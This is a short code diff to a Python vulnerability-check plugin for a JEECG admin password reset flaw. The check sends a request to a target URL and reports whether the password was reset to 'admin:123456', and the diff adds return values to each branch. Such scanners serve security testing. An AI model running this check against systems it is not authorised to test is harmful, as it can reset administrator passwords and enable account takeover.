@@ -25,11 +25,14 @@ class jeecg_pwd_reset_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"loginController.do?pwdInit" in req.text:
                 cprint("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl+"\tadmin:123456", "red")
+                return True, vulnurl, "jeecg 重置admin密码", payload, req.text
             else:
                 cprint("[-]不存在jeecg_pwd_reset漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
